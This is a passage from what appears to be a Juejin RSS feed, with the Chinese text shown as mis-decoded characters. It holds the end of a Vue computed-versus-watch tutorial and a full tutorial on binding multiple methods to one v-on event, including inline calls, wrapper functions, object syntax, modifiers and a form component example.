</code></pre>
<p>åªä¼šè¾“å‡ºä¸€æ¬¡ "é‡æ–°è®¡ç®—ï¼"ï¼Œå› ä¸º computed ä¼šç¼“å­˜ç»“æœã€‚</p>
<h2 data-id="heading-11">å…«ã€ç»„åˆå¼ API ä¸­çš„ä½¿ç”¨</h2>
<p>åœ¨ Vue 3 çš„ Composition API ä¸­ï¼Œä½¿ç”¨æ–¹å¼ç•¥æœ‰ä¸åŒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>Â {Â ref,Â computed,Â watchÂ }Â <span class="hljs-keyword">from</span>Â <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">export</span>Â <span class="hljs-keyword">default</span>Â {
Â Â <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>)Â {
Â Â Â Â <span class="hljs-keyword">const</span>Â countÂ =Â <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
Â Â Â Â <span class="hljs-keyword">const</span>Â doubleCountÂ =Â <span class="hljs-title function_">computed</span>(<span class="hljs-function">()Â =&gt;</span>Â count.<span class="hljs-property">value</span>Â *Â <span class="hljs-number">2</span>)
Â Â Â Â 
Â Â Â Â <span class="hljs-title function_">watch</span>(count,Â <span class="hljs-function">(<span class="hljs-params">newValue,Â oldValue</span>)Â =&gt;</span>Â {
Â Â Â Â Â Â <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`countä»<span class="hljs-subst">${oldValue}</span>å˜ä¸º<span class="hljs-subst">${newValue}</span>`</span>)
Â Â Â Â })
Â Â Â Â 
Â Â Â Â <span class="hljs-keyword">return</span>Â {Â count,Â doubleCountÂ }
Â Â }
}
</code></pre>
<h2 data-id="heading-12">æ€»ç»“</h2>
<p>è®°ä½è¿™ä¸ªç®€å•çš„<strong>å†³ç­–æµç¨‹</strong>ï¼š</p>
<ol>
<li>1.Â <strong>éœ€è¦åŸºäºç°æœ‰æ•°æ®è®¡ç®—ä¸€ä¸ªæ–°å€¼å—ï¼Ÿ</strong> Â â†’ ç”¨Â <code>computed</code></li>
<li>2.Â <strong>éœ€è¦åœ¨æ•°æ®å˜åŒ–æ—¶æ‰§è¡ŒæŸäº›æ“ä½œå—ï¼Ÿ</strong> Â â†’ ç”¨Â <code>watch</code></li>
<li>3.Â <strong>è¿™ä¸ªè®¡ç®—éœ€è¦åœ¨æ¨¡æ¿ä¸­ç®€æ´è¡¨è¾¾å—ï¼Ÿ</strong> Â â†’ ç”¨Â <code>computed</code></li>
<li>4.Â <strong>éœ€è¦å¤„ç†å¼‚æ­¥æ“ä½œæˆ–å¤æ‚ä¸šåŠ¡é€»è¾‘å—ï¼Ÿ</strong> Â â†’ ç”¨Â <code>watch</code></li>
</ol>
<p><strong>é»„é‡‘æ³•åˆ™</strong>ï¼šèƒ½ç”¨ computed å®ç°çš„ï¼Œä¼˜å…ˆä½¿ç”¨ computedï¼›åªæœ‰åœ¨éœ€è¦"å‰¯ä½œç”¨"æ“ä½œæ—¶ï¼Œæ‰ä½¿ç”¨ watchã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ æ›´å¥½åœ°ç†è§£å’Œä½¿ç”¨ Vue ä¸­çš„ computed å’Œ watchï¼åœ¨å®é™…å¼€å‘ä¸­çµæ´»è¿ç”¨è¿™ä¸¤ä¸ªç‰¹æ€§ï¼Œèƒ½è®©ä½ çš„ä»£ç æ›´åŠ æ¸…æ™°ã€é«˜æ•ˆã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue æŠ€å·§æ­ç§˜ï¼šä¸€ä¸ªäº‹ä»¶è§¦å‘å¤šä¸ªæ–¹æ³•ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7595021656428445723</link>    <guid>https://juejin.cn/post/7595021656428445723</guid>    <pubDate>2026-01-14T13:30:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595021656428445723" data-draft-id="7595041883145109550" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue æŠ€å·§æ­ç§˜ï¼šä¸€ä¸ªäº‹ä»¶è§¦å‘å¤šä¸ªæ–¹æ³•ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T13:30:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—è¾°alk"/> <meta itemprop="url" content="https://juejin.cn/user/1772855673241352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue æŠ€å·§æ­ç§˜ï¼šä¸€ä¸ªäº‹ä»¶è§¦å‘å¤šä¸ªæ–¹æ³•ï¼Œä½ ç«Ÿç„¶è¿˜ä¸çŸ¥é“ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1772855673241352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—è¾°alk
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T13:30:40.000Z" title="Wed Jan 14 2026 13:30:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>è§£é” v-on çš„é«˜çº§ç”¨æ³•ï¼Œè®©ä½ çš„ Vue ä»£ç æ›´åŠ ä¼˜é›…é«˜æ•ˆï¼</p>
</blockquote>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨ Vue å¼€å‘ä¸­ï¼Œ<code>v-on</code>ï¼ˆæˆ– <code>@</code>ï¼‰æ˜¯æˆ‘ä»¬æœ€å¸¸ç”¨çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚ä½†ä½ æ˜¯å¦æ›¾ç»é‡åˆ°è¿‡è¿™æ ·çš„åœºæ™¯ï¼š<strong>ä¸€ä¸ªæŒ‰é’®ç‚¹å‡»åéœ€è¦æ‰§è¡Œå¤šä¸ªæ“ä½œ</strong>ï¼Ÿæ¯”å¦‚ç‚¹å‡»"æäº¤"æŒ‰é’®æ—¶ï¼Œæ—¢è¦éªŒè¯è¡¨å•ï¼Œåˆè¦å‘é€è¯·æ±‚ï¼Œè¿˜è¦æ˜¾ç¤ºåŠ è½½çŠ¶æ€ã€‚</p>
<p>ä½ ä¼šæ€ä¹ˆå¤„ç†ï¼ŸåµŒå¥—è°ƒç”¨ï¼Ÿå†™ä¸€ä¸ªåŒ…è£…å‡½æ•°ï¼Ÿå…¶å®ï¼ŒVue æ—©å°±ä¸ºæˆ‘ä»¬æä¾›äº†æ›´ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆï¼</p>
<h2 data-id="heading-1">ä¸€ã€ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼šå¯ä»¥ç»‘å®šå¤šä¸ªæ–¹æ³•ï¼</h2>
<p>è®©æˆ‘ä»¬ç›´æ¥çœ‹ç­”æ¡ˆï¼š<strong>Vue çš„ <code>v-on</code> ç¡®å®å¯ä»¥ç»‘å®šå¤šä¸ªæ–¹æ³•</strong>ï¼Œè€Œä¸”æœ‰ä¸æ­¢ä¸€ç§å®ç°æ–¹å¼ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸ªæœ€å¸¸è§çš„éœ€æ±‚åœºæ™¯ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- å¸¸è§çš„â€œä¸ä¼˜é›…â€åšæ³• --&gt;
    &lt;button @click="handleSubmit"&gt;
      æäº¤è®¢å•
    &lt;/button&gt;
    
    &lt;!-- æ›´ä¼˜é›…çš„å¤šæ–¹æ³•ç»‘å®š --&gt;
    &lt;button @click="validateForm(), submitData(), logActivity()"&gt;
      æ™ºèƒ½æäº¤
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  methods: {
    handleSubmit() {
      // ä¼ ç»Ÿæ–¹å¼ï¼šæŠŠæ‰€æœ‰é€»è¾‘å†™åœ¨ä¸€ä¸ªæ–¹æ³•é‡Œ
      this.validateForm()
      this.submitData()
      this.logActivity()
    },
    
    validateForm() {
      console.log('éªŒè¯è¡¨å•...')
    },
    
    submitData() {
      console.log('æäº¤æ•°æ®...')
    },
    
    logActivity() {
      console.log('è®°å½•ç”¨æˆ·è¡Œä¸º...')
    }
  }
}
&lt;/script&gt;
</code></pre>
<h2 data-id="heading-2">äºŒã€å››ç§å®ç°æ–¹å¼è¯¦è§£</h2>
<h3 data-id="heading-3">æ–¹å¼ä¸€ï¼šç›´æ¥è°ƒç”¨å¤šä¸ªæ–¹æ³•ï¼ˆæœ€ç®€æ´ï¼‰</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;button @click="method1(), method2(), method3()"&gt;
    ç‚¹å‡»æ‰§è¡Œä¸‰ä¸ªæ–¹æ³•
  &lt;/button&gt;
&lt;/template&gt;
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… æœ€ç›´è§‚ï¼Œç›´æ¥åœ¨æ¨¡æ¿ä¸­è°ƒç”¨</li>
<li>âœ… å¯ä»¥ä¼ é€’å‚æ•°</li>
<li>âŒ æ¨¡æ¿ä¼šæ˜¾å¾—æœ‰ç‚¹"æ‹¥æŒ¤"</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;!-- ä¼ é€’å‚æ•° --&gt;
    &lt;button @click="
      logClick('æŒ‰é’®è¢«ç‚¹å‡»äº†'),
      incrementCounter(1),
      sendAnalytics('button_click')
    "&gt;
      å¸¦å‚æ•°çš„å¤šæ–¹æ³•è°ƒç”¨
    &lt;/button&gt;
    
    &lt;!-- è®¿é—®äº‹ä»¶å¯¹è±¡ --&gt;
    &lt;button @click="
      handleClick1($event),
      handleClick2($event),
      preventDefaults($event)
    "&gt;
      ä½¿ç”¨äº‹ä»¶å¯¹è±¡
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  methods: {
    logClick(message) {
      console.log(message)
    },
    incrementCounter(amount) {
      this.count += amount
    },
    sendAnalytics(eventName) {
      // å‘é€åˆ†ææ•°æ®
    },
    preventDefaults(event) {
      event.preventDefault()
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-4">æ–¹å¼äºŒï¼šè°ƒç”¨ä¸€ä¸ªåŒ…è£…å‡½æ•°ï¼ˆæœ€ä¼ ç»Ÿï¼‰</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;button @click="handleAllMethods"&gt;
    åŒ…è£…å‡½æ•°æ–¹å¼
  &lt;/button&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  methods: {
    handleAllMethods() {
      this.method1()
      this.method2()
      this.method3()
    },
    method1() { /* ... */ },
    method2() { /* ... */ },
    method3() { /* ... */ }
  }
}
&lt;/script&gt;
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>æ–¹æ³•ä¹‹é—´æœ‰å¤æ‚çš„æ‰§è¡Œé¡ºåº</li>
<li>éœ€è¦æ¡ä»¶åˆ¤æ–­</li>
<li>éœ€è¦é”™è¯¯å¤„ç†</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;script&gt;
export default {
  methods: {
    async handleComplexClick() {
      // 1. å…ˆéªŒè¯
      const isValid = this.validateForm()
      if (!isValid) return
      
      // 2. æ˜¾ç¤ºåŠ è½½
      this.showLoading = true
      
      try {
        // 3. æ‰§è¡Œå¤šä¸ªå¼‚æ­¥æ“ä½œ
        await Promise.all([
          this.submitData(),
          this.logActivity(),
          this.updateCache()
        ])
        
        // 4. æ˜¾ç¤ºæˆåŠŸæç¤º
        this.showSuccess()
      } catch (error) {
        // 5. é”™è¯¯å¤„ç†
        this.handleError(error)
      } finally {
        // 6. éšè—åŠ è½½
        this.showLoading = false
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-5">æ–¹å¼ä¸‰ï¼šä½¿ç”¨å¯¹è±¡è¯­æ³•ï¼ˆæœ€çµæ´»ï¼‰</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;button v-on="{ click: [method1, method2, method3] }"&gt;
    å¯¹è±¡è¯­æ³•ï¼ˆæ•°ç»„å½¢å¼ï¼‰
  &lt;/button&gt;
  
  &lt;!-- æˆ–è€… --&gt;
  &lt;button v-on="eventHandlers"&gt;
    å¯¹è±¡è¯­æ³•ï¼ˆå“åº”å¼å¯¹è±¡ï¼‰
  &lt;/button&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      eventHandlers: {
        click: this.handleClick,
        mouseenter: this.handleMouseEnter,
        mouseleave: this.handleMouseLeave
      }
    }
  },
  methods: {
    handleClick() {
      this.method1()
      this.method2()
    },
    method1() { /* ... */ },
    method2() { /* ... */ }
  }
}
&lt;/script&gt;
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… å¯ä»¥åŠ¨æ€ç»‘å®šäº‹ä»¶å¤„ç†å™¨</li>
<li>âœ… æ”¯æŒå¤šä¸ªä¸åŒäº‹ä»¶ç±»å‹</li>
<li>âœ… é€‚åˆéœ€è¦åŠ¨æ€åˆ‡æ¢äº‹ä»¶å¤„ç†é€»è¾‘çš„åœºæ™¯</li>
</ul>
<h3 data-id="heading-6">æ–¹å¼å››ï¼šä¿®é¥°ç¬¦ç»„åˆï¼ˆæœ€ Vueï¼‰</h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- ç»“åˆä¿®é¥°ç¬¦ --&gt;
  &lt;button @click.stop.prevent="method1(), method2()"&gt;
    å¸¦ä¿®é¥°ç¬¦çš„å¤šæ–¹æ³•
  &lt;/button&gt;
  
  &lt;!-- é”®ç›˜äº‹ä»¶å¤šæ–¹æ³• --&gt;
  &lt;input 
    @keyup.enter="
      validateInput(),
      submitForm(),
      clearInput()
    "
    @keyup.esc="cancelEdit(), resetForm()"
  &gt;
&lt;/template&gt;
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€å®æˆ˜æ¡ˆä¾‹ï¼šä¸€ä¸ªå®Œæ•´çš„è¡¨å•ç»„ä»¶</h2>
<p>è®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªå®é™…çš„ä¸šåŠ¡åœºæ™¯ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="smart-form"&gt;
    &lt;form @submit.prevent="handleSmartSubmit"&gt;
      &lt;input v-model="formData.email" placeholder="é‚®ç®±"&gt;
      &lt;input v-model="formData.password" type="password" placeholder="å¯†ç "&gt;
      
      &lt;button 
        type="submit"
        :disabled="isSubmitting"
        @click="
          $event.stopPropagation(),
          validateBeforeSubmit(),
          trackButtonClick('submit_button')
        "
        @mouseenter="showTooltip = true"
        @mouseleave="showTooltip = false"
      &gt;
        {{ isSubmitting ? 'æäº¤ä¸­...' : 'æ™ºèƒ½æäº¤' }}
      &lt;/button&gt;
      
      &lt;div v-if="showTooltip" class="tooltip"&gt;
        ç‚¹å‡»åæ‰§è¡Œï¼šéªŒè¯ â†’ æäº¤ â†’ è®°å½• â†’ åˆ†æ
      &lt;/div&gt;
    &lt;/form&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script&gt;
export default {
  data() {
    return {
      formData: {
        email: '',
        password: ''
      },
      isSubmitting: false,
      showTooltip: false
    }
  },
  
  methods: {
    async handleSmartSubmit() {
      if (this.isSubmitting) return
      
      this.isSubmitting = true
      
      try {
        // å¹¶è¡Œæ‰§è¡Œå¤šä¸ªæ“ä½œ
        await Promise.all([
          this.submitToServer(),
          this.logUserActivity(),
          this.updateLocalStorage()
        ])
        
        // ä¸²è¡Œæ‰§è¡Œåç»­æ“ä½œ
        this.showSuccessMessage()
        this.redirectToDashboard()
        this.sendAnalytics('form_submit_success')
        
      } catch (error) {
        this.handleError(error)
        this.sendAnalytics('form_submit_error', { error: error.message })
      } finally {
        this.isSubmitting = false
      }
    },
    
    validateBeforeSubmit() {
      if (!this.formData.email) {
        throw new Error('é‚®ç®±ä¸èƒ½ä¸ºç©º')
      }
      // æ›´å¤šéªŒè¯é€»è¾‘...
    },
    
    trackButtonClick(buttonName) {
      console.log(`æŒ‰é’®è¢«ç‚¹å‡»: ${buttonName}`)
      // å®é™…é¡¹ç›®ä¸­è¿™é‡Œå¯èƒ½æ˜¯å‘é€åˆ°åˆ†æå¹³å°
    },
    
    async submitToServer() {
      // API è°ƒç”¨
      const response = await fetch('/api/submit', {
        method: 'POST',
        body: JSON.stringify(this.formData)
      })
      return response.json()
    },
    
    logUserActivity() {
      // è®°å½•ç”¨æˆ·è¡Œä¸º
      console.log('ç”¨æˆ·æäº¤è¡¨å•', this.formData)
    },
    
    updateLocalStorage() {
      // ä¿å­˜åˆ°æœ¬åœ°
      localStorage.setItem('lastSubmit', new Date().toISOString())
    },
    
    showSuccessMessage() {
      this.$emit('success', 'æäº¤æˆåŠŸï¼')
    },
    
    redirectToDashboard() {
      setTimeout(() =&gt; {
        this.$router.push('/dashboard')
      }, 1500)
    },
    
    sendAnalytics(eventName, data = {}) {
      // å‘é€åˆ†ææ•°æ®
      console.log(`åˆ†æäº‹ä»¶: ${eventName}`, data)
    },
    
    handleError(error) {
      console.error('æäº¤é”™è¯¯:', error)
      this.$emit('error', error.message)
    }
  }
}
&lt;/script&gt;

&lt;style scoped&gt;
.smart-form {
  max-width: 400px;
  margin: 0 auto;
}

.tooltip {
  background: #f0f0f0;
  padding: 8px;
  border-radius: 4px;
  margin-top: 8px;
  font-size: 12px;
  color: #666;
}
&lt;/style&gt;
</code></pre>
<h2 data-id="heading-8">å››ã€æœ€ä½³å®è·µå’Œæ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-9">1. <strong>ä¿æŒæ¨¡æ¿ç®€æ´</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- ä¸æ¨èï¼šæ¨¡æ¿è¿‡äºå¤æ‚ --&gt;
&lt;button @click="
  validateForm($event, formData, true),
  submitForm(formData, config),
  logEvent('submit', { time: Date.now() }),
  showLoading(),
  redirectAfter(3000)
"&gt;
  æäº¤
&lt;/button&gt;

&lt;!-- æ¨èï¼šå¤æ‚é€»è¾‘æ”¾åœ¨æ–¹æ³•ä¸­ --&gt;
&lt;button @click="handleComplexSubmit"&gt;
  æäº¤
&lt;/button&gt;
</code></pre>
<h3 data-id="heading-10">2. <strong>é”™è¯¯å¤„ç†å¾ˆé‡è¦</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script&gt;
export default {
  methods: {
    safeMultiMethods() {
      try {
        this.method1()
        this.method2()
        this.method3()
      } catch (error) {
        console.error('æ–¹æ³•æ‰§è¡Œå¤±è´¥:', error)
        this.handleGracefully(error)
      }
    }
  }
}
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-11">3. <strong>è€ƒè™‘æ‰§è¡Œé¡ºåº</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;!-- æ³¨æ„ï¼šæ–¹æ³•æŒ‰é¡ºåºæ‰§è¡Œ --&gt;
  &lt;button @click="
    firstMethod(),  // å…ˆæ‰§è¡Œ
    secondMethod(), // ç„¶åæ‰§è¡Œ
    thirdMethod()   // æœ€åæ‰§è¡Œ
  "&gt;
    é¡ºåºæ‰§è¡Œ
  &lt;/button&gt;
&lt;/template&gt;
</code></pre>
<h3 data-id="heading-12">4. <strong>å¼‚æ­¥æ–¹æ³•å¤„ç†</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script&gt;
export default {
  methods: {
    async handleAsyncMethods() {
      // å¹¶è¡Œæ‰§è¡Œ
      await Promise.all([
        this.asyncMethod1(),
        this.asyncMethod2()
      ])
      
      // ä¸²è¡Œæ‰§è¡Œ
      await this.asyncMethod3()
      await this.asyncMethod4()
    }
  }
}
&lt;/script&gt;
</code></pre>
<h2 data-id="heading-13">äº”ã€æ€§èƒ½è€ƒè™‘</h2>
<h3 data-id="heading-14">1. <strong>é¿å…åœ¨æ¨¡æ¿ä¸­æ‰§è¡Œå¤æ‚è®¡ç®—</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;!-- ä¸æ¨è --&gt;
&lt;button @click="
  heavyCalculation(data),
  processResults(result)
"&gt;
  æ‰§è¡Œ
&lt;/button&gt;

&lt;!-- æ¨è --&gt;
&lt;button @click="handleHeavyOperations"&gt;
  æ‰§è¡Œ
&lt;/button&gt;
</code></pre>
<h3 data-id="heading-15">2. <strong>ä½¿ç”¨ computed å±æ€§å‡å°‘é‡å¤è°ƒç”¨</strong></h3>
<pre><code class="hljs language-vue" lang="vue">&lt;script&gt;
export default {
  computed: {
    // ç¼“å­˜è®¡ç®—ç»“æœ
    processedData() {
      return this.heavyCalculation(this.data)
    }
  },
  
  methods: {
    handleClick() {
      // ç›´æ¥ä½¿ç”¨ç¼“å­˜ç»“æœ
      this.processResults(this.processedData)
      this.logAction()
    }
  }
}
&lt;/script&gt;
</code></pre>
<h2 data-id="heading-16">å…­ã€Vue 3 ä¸­çš„å˜åŒ–</h2>
<p>åœ¨ Vue 3 çš„ Composition API ä¸­ï¼Œç”¨æ³•åŸºæœ¬ä¿æŒä¸€è‡´ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;button @click="method1(), method2()"&gt;
    Vue 3 å¤šæ–¹æ³•
  &lt;/button&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref } from 'vue'

const count = ref(0)

const method1 = () =&gt; {
  console.log('æ–¹æ³•1')
  count.value++
}

const method2 = () =&gt; {
  console.log('æ–¹æ³•2')
}
&lt;/script&gt;
</code></pre>
<h2 data-id="heading-17">æ€»ç»“</h2>
<p><strong>v-on ç»‘å®šå¤šä¸ªæ–¹æ³•çš„å››ç§æ–¹å¼ï¼š</strong></p>
<ol>
<li><strong>ç›´æ¥è°ƒç”¨å¤šä¸ªæ–¹æ³•</strong> - é€‚åˆç®€å•åœºæ™¯</li>
<li><strong>åŒ…è£…å‡½æ•°</strong> - é€‚åˆå¤æ‚é€»è¾‘å’Œå¤ç”¨</li>
<li><strong>å¯¹è±¡è¯­æ³•</strong> - é€‚åˆåŠ¨æ€äº‹ä»¶å¤„ç†</li>
<li><strong>ä¿®é¥°ç¬¦ç»„åˆ</strong> - é€‚åˆéœ€è¦äº‹ä»¶ä¿®é¥°çš„åœºæ™¯</li>
</ol>
<p><strong>é€‰æ‹©å»ºè®®ï¼š</strong></p>
<ul>
<li>ç®€å•é€»è¾‘ï¼šä½¿ç”¨æ–¹å¼ä¸€ï¼ˆç›´æ¥è°ƒç”¨ï¼‰</li>
<li>å¤æ‚ä¸šåŠ¡ï¼šä½¿ç”¨æ–¹å¼äºŒï¼ˆåŒ…è£…å‡½æ•°ï¼‰</li>
<li>åŠ¨æ€éœ€æ±‚ï¼šä½¿ç”¨æ–¹å¼ä¸‰ï¼ˆå¯¹è±¡è¯­æ³•ï¼‰</li>
<li>äº‹ä»¶æ§åˆ¶ï¼šä½¿ç”¨æ–¹å¼å››ï¼ˆä¿®é¥°ç¬¦ç»„åˆï¼‰</li>
</ul>
